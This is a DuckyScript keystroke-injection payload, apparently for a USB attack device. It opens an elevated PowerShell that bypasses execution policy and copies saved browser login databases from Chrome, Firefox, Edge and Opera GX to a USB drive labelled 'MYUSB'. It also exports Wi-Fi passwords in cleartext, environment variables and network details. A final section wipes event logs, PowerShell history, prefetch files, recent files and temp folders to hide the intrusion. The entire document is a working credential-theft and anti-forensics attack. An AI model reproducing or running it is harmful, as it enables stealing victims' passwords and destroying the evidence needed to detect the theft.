
REM ============================== READ ME & CREDITS ===================================
REM || Script based on markcyber's work, updated for stealthier operation by Nonnamme ||
REM || Credits: Based on (github.com/markcyber) Updated by (github.com/GreyHatUser)   ||
REM || Requieres an Exfil USB drive named 'MYUSB', can be changed to another name     ||
REM ====================================================================================

REM =============================== CURRENT VERSION ====================================
REM ||                                                                                ||
REM ||                                  v2.1.1                                        ||
REM ||                                                                                ||
REM ====================================================================================


REM =======================================================
REM ----------------- SECTION 1 - START -------------------
REM =======================================================

DELAY 1000
GUI r
DELAY 150
STRING powershell -NoProfile -ExecutionPolicy Bypass
DELAY 300
CTRL-SHIFT ENTER
DELAY 1550
LEFT
DELAY 50
ENTER
DELAY 2500


REM =======================================================
REM ------------------ END SECTION 1 ----------------------
REM =======================================================



REM =======================================================
REM --- SECTION 2 - Check USB, Clone Login Data to USB ----
REM =======================================================

REM Change here the exfil USB drive name if needed
STRING $usbDrive = Get-WmiObject Win32_Volume | ? { $_.Label -eq 'MYUSB' } | Select -ExpandProperty DriveLetter; if ($usbDrive -ne $null) {
ENTER
DELAY 300
STRING cd "$usbDrive\"
ENTER
DELAY 300

STRING mkdir BrowserData -ErrorAction SilentlyContinue;
ENTER
DELAY 300
STRING cd BrowserData;
ENTER
DELAY 150

STRING $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"; if (Test-Path $chromePath) { Copy-Item $chromePath "$usbDrive\BrowserData\ChromeLoginData" -Recurse -Force -ErrorAction SilentlyContinue; }
ENTER
DELAY 300

STRING $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\"; if (Test-Path $firefoxPath) { Copy-Item $firefoxPath "$usbDrive\BrowserData\FirefoxData" -Recurse -Force -ErrorAction SilentlyContinue; }
ENTER
DELAY 300

STRING $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"; if (Test-Path $edgePath) { Copy-Item $edgePath "$usbDrive\BrowserData\EdgeLoginData" -Recurse -Force -ErrorAction SilentlyContinue; }
ENTER
DELAY 300

REM Copy Opera GX browser addition
STRING $operaPath = "$env:APPDATA\Opera Software\Opera GX Stable\Login Data"; if (Test-Path $operaPath) { Copy-Item $operaPath "$usbDrive\BrowserData\OperaGXData" -Recurse -Force -ErrorAction SilentlyContinue; }
ENTER
DELAY 300

STRING }
ENTER
DELAY 1500


REM =======================================================
REM ------------------ END SECTION 2 ----------------------
REM =======================================================



REM =======================================================
REM ------- SECTION 2B - SysInfo and Credential Dump ------
REM =======================================================

REM Create SysInfo folder inside external USB
STRING mkdir "$usbDrive\SystemInfo" -ErrorAction SilentlyContinue
ENTER
DELAY 150

REM Clone wifi profiles and passwords to file
STRING netsh wlan export profile key=clear folder="$usbDrive\SystemInfo" > $null 2>&1
ENTER
DELAY 200

REM Save env variables
STRING Get-ChildItem Env: | Out-File "$usbDrive\SystemInfo\EnvironmentVariables.txt" -Encoding UTF8
ENTER
DELAY 250

REM Save ip addresses and net info
STRING Get-NetIPAddress -AddressFamily IPv4 | Out-File "$usbDrive\SystemInfo\IPv4Addresses.txt" -Encoding UTF8
ENTER
DELAY 300

REM More detailed net config
STRING ipconfig /all | Out-File "$usbDrive\SystemInfo\NetworkConfig.txt" -Encoding UTF8
ENTER
DELAY 150

REM =======================================================
REM ------------------ END SECTION 2B ---------------------
REM =======================================================



REM =======================================================
REM ------- SECTION 3 - Post-Payload Trace Clearing -------
REM =======================================================

REM Clear exported xml's from syst folders
STRING Remove-Item "$env:SystemRoot\Wireless*.xml" -Force -ErrorAction SilentlyContinue
ENTER
DELAY 150

REM Clear file history
STRING Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
ENTER
DELAY 80

REM Delete prefetch entries for WPS and PS Core
STRING Remove-Item "$env:SystemRoot\Prefetch\POWERSHELL*.pf","$env:SystemRoot\Prefetch\PWSH*.pf" -Force -ErrorAction SilentlyContinue
ENTER
DELAY 150

REM Delete TEMP and TMP 
STRING Remove-Item "$env:TEMP\*","$env:TMP\*" -Recurse -Force -ErrorAction SilentlyContinue
ENTER
DELAY 150

REM Clear DNS cache
STRING ipconfig /flushdns
ENTER
DELAY 250

REM Clear netsh op logs (if there are any)
STRING wevtutil cl "Microsoft-Windows-NetworkProfile/Operational"
ENTER
DELAY 150
STRING wevtutil cl "Microsoft-Windows-WLAN-AutoConfig/Operational"
ENTER
DELAY 150

REM Clear clipboard
STRING echo off | clip
ENTER
DELAY 200

REM Clear both PowerShell event logs
STRING wevtutil cl "Microsoft-Windows-PowerShell/Operational"; wevtutil cl "Windows PowerShell"
ENTER
DELAY 150

REM Clear PowerShell history, (if) in case PSReadline is not available
STRING if (Get-Command Get-PSReadlineOption -ErrorAction SilentlyContinue) { Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue }
ENTER
DELAY 200

REM =======================================================
REM ------------------ END SECTION 3 ----------------------
REM =======================================================


REM Last history clear before exit
STRING Clear-History -ErrorAction SilentlyContinue
ENTER
DELAY 50

REM Close PowerShell
STRING exit
ENTER